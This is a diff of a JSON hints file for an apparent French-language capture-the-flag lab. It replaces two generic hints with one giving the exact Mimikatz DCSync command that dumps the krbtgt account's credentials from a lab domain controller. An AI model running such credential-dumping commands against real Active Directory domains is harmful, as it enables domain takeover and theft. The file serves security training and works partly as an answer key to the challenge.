@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
-    "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter ad-dcsync-mimikatz."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
-    "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "title": "Syntaxe Mimikatz",
+    "cost": 20,
+    "content": "lsadump::dcsync /domain:cyberdyne.local /user:krbtgt"
   }
 ]
